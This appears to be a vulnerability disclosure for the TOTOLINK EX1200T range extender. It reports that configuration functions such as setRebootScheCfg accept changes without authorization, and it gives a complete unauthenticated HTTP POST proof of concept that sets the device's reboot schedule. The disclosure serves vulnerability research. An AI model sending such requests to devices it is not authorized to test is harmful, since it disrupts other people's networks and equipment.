# TOTOLINK EX1200T REBOOT

## Reboot Vulnerability Description

PRODUCT: TOTOLINK EX1200T V4.1.2cu.5215 (latest version)

Most of the function `setXxxxxx` in the file `xxx.so`  can cause an attacker to change the configuration without authorization.

For example, in the function `setRebootScheCfg` of the file `system.so`, attacker can set the restart time.

![image-20211102223356671](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211102223356671.png)

## PoC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.254
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
If-Modified-Since: Thu, 01 Jan 1970 00:00:03 GMT
Connection: close
Content-Length: 95

{"topicurl":"setting/setRebootScheCfg",
"mode":"1","week":"6",
"hour":"13",
"minute":"13"
}
```

After:

![image-20211102223518276](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211102223518276.png)